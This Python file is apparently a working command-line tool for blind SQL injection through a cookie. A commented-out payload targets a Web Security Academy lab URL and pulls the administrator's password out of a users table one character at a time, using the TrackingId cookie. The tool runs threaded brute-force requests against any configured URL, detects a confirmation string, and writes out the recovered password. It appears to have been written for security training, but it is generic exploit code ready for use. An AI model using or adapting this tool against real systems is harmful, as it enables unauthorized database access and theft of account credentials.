#!/usr/bin/env python3.12
# cookie_injector.py ver 1.1
import datetime
import http.client
import json
import sys
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

import click
import requests
from rich.console import Console
from rich.live import Live
from rich.markdown import Markdown
from rich.panel import Panel

from SQLInjector.brute_forcer import BruteForcer
from SQLInjector.cookie_injector_core import CookieInjector

c = Console()

# url = "https://0a6c002f031d991d81c225db00ea0044.web-security-academy.net/product?productId=13"
#
# code_to_inject = ("""
# ' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--
# """,)[0]
#
# password_length = 20
# payload_character_set = [letter for letter in string.ascii_letters] + [num for num in range(0, 10)]
# confirmation_string = b"Welcome"
# cookie = "TrackingId"

# threads = 20
# queues = [Queue() for queue in range(threads)]
futures = []


class Injector:
    def __init__(self, target_url, confirm_string, cookie_name, passwd_length: int, char_set, inject_code,
                 max_threads: int):
        self.url = target_url
        self.confirm_string = confirm_string
        self.cookie_name = cookie_name
        self.passwd_length = passwd_length
        self.char_set = char_set
        self.inject_code = inject_code
        self.max_threads = max_threads
        self.queues = [Queue() for queue in range(self.max_threads)]
        self.futures = []
        self.found_characters = {}
        self.discard_seq_num = []
        self.debug_skipped = []
        self.status_code_to_description = {}

    def check_url(self):
        self.status_code_to_description = {code: description for code, description in http.client.responses.items()}
        try:
            response = requests.head(self.url)
            if response.status_code == 200:
                c.print(f"The URL is responding", style="green")
            c.print(
                f"Status code {response.status_code} -> {self.status_code_to_description[response.status_code]}.\n"
                f"Press CTRL+C to abort."
            )
        except requests.RequestException as e:
            c.print(f"Error: {e}")
            print()
            c.print(f"The URL {self.url} is not responding.", style="red")
            sys.exit(1)

    def brute_forcer(self):
        bf = BruteForcer(self.passwd_length, self.char_set, self.inject_code)
        for i, payload_kit in enumerate(bf.brute_force()):
            thread_id = i % self.max_threads
            self.queues[thread_id].put(payload_kit)

    def cookie_injector(self, inject_code, seq_num, char, start_time):
        if seq_num not in self.discard_seq_num:
            cookie_injector = CookieInjector(self.url, self.confirm_string, self.cookie_name)
            char_found = cookie_injector.run(inject_code, seq_num, char)
            if char_found:
                self.found_characters[f"Char {seq_num}"] = char
                self.discard_seq_num.append(seq_num)
                now = datetime.datetime.now()
                elapsed_time = now - start_time
                with Live():
                    c.print(
                        Panel(
                            f"{self.found_characters}\n"
                            f"Brute forced positions {len(self.discard_seq_num)} --> {self.discard_seq_num}\n"
                            f"Time elapsed {elapsed_time}",
                            title="Found Char",
                            title_align="left",
                            highlight=True
                        )
                    )
        else:
            pass


def load_config(config_file_path):
    try:
        with open(config_file_path, "r") as config_file:
            return json.load(config_file)
    except FileNotFoundError:
        from SQLInjector import cookie_injector_setup
        cookie_injector_setup.main()
        with open(config_file_path, "r") as config_file:
            return json.load(config_file)


def initialize_data(config):
    target_url = config.get("target_url")
    confirm_string = config.get("confirm_string").encode()
    cookie_name = config.get("cookie_name")
    passwd_length = int(config.get("passwd_length"))
    char_set = config.get("char_set")
    inject_code = config.get("inject_code")
    max_threads = int(config.get("max_threads"))
    return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads


def print_config_file(config_file_path):
    with open(config_file_path, "r") as config_file:
        config_file_content = json.loads(config_file.read())
    print()
    c.print(config_file_content)


def run_cookie_injector_setup():
    from SQLInjector import cookie_injector_setup
    cookie_injector_setup.main()


def thread_pool_executor(max_threads, injector, passwd_length, start_time):
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for thread_id, working_queue in enumerate(injector.queues):
            while not working_queue.empty():
                if len(injector.discard_seq_num) != passwd_length:
                    payload = working_queue.get()
                    future = executor.submit(
                        injector.cookie_injector,
                        payload.inject_code,
                        payload.sequence_num,
                        payload.character,
                        start_time
                    )
                    futures.append(future)
                else:
                    break


# Add option to run setup and to change url
@click.command(
    help="This app injects a cookie, sends the crafted request, "
         "and checks the response from the page content.\n"
         "It needs a configuration file, you can edit manually, "
         "the 'config/cookie_injector.json' in the current working directory, "
         "or you can run the setup utility."
)
@click.option(
    "-u", "--set-url", "set_url",
    help="Edit target URL.",
    required=False,
    type=str
)
@click.option(
    "-s", "--setup-utility", "setup_utility",
    help="Interactively edit the config file.",
    is_flag=True,
    required=False,
    default=False,
)
@click.option(
    "-f", "--config-file", "config_file_path",
    help="Path to config file.",
    default="config/cookie_injector.json",
    show_default=True,
    type=click.Path(exists=False),
    required=True
)
@click.option(
    "-o", "--out-file", "out_file",
    help="Path to output file with the recovered password.",
    # default="cookie_inj_recovered_passwd.txt",
    type=click.Path(exists=False),
    required=False
)
def start_threads(set_url, config_file_path, out_file, setup_utility):
    try:
        if setup_utility:
            run_cookie_injector_setup()
        config = load_config(config_file_path)
        target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads = initialize_data(
            config)
        if set_url:
            target_url = set_url
            c.print(f"Target URL: {target_url}")
        injector = Injector(target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads)
        start_time = datetime.datetime.now()
        c.print(f"Start time {start_time}.", style="blue")
        injector.check_url()
        injector.brute_forcer()
        print_config_file(config_file_path)
        c.print(Markdown("# Brute forcing password.."))
        thread_pool_executor(max_threads, injector, passwd_length, start_time)
        process_passwd_data(injector, start_time, out_file)
    except KeyboardInterrupt:
        for future in futures:
            future.cancel()
        sys.exit("\n\nExiting, please wait.\n\nBye.\n")


def process_passwd_data(injector_obj, start_time, out_file):
    found_characters = injector_obj.found_characters
    ordered_passwd_dict = OrderedDict(sorted(found_characters.items(), key=lambda item: int(item[0].split()[1])))
    clear_text_passwd = ""
    for k, v in ordered_passwd_dict.items():
        clear_text_passwd += str(v)
    end_time = datetime.datetime.now()
    run_time = end_time - start_time
    if len(clear_text_passwd) >= 1:
        message = f"Password successfully brute forced: {clear_text_passwd}"
        c.print(message, style="green")
        if out_file:
            with open(out_file, "w") as output_file:
                output_file.write(message)
            c.print(f"Output file '{out_file}' created successfully.")
    else:
        message = f"No password recovered."
        c.print(message, style="red")
        if out_file:
            with open(out_file, "w") as output_file:
                output_file.write(message)
            c.print(f"Output file '{out_file}' created successfully.")
    c.print(f"Completed in {run_time} seconds at {end_time}.", style="blue")


def main():
    try:
        start_threads()
    except KeyboardInterrupt:
        for f in futures:
            f.cancel()
        sys.exit("\nBye.")


if __name__ == '__main__':
    main()
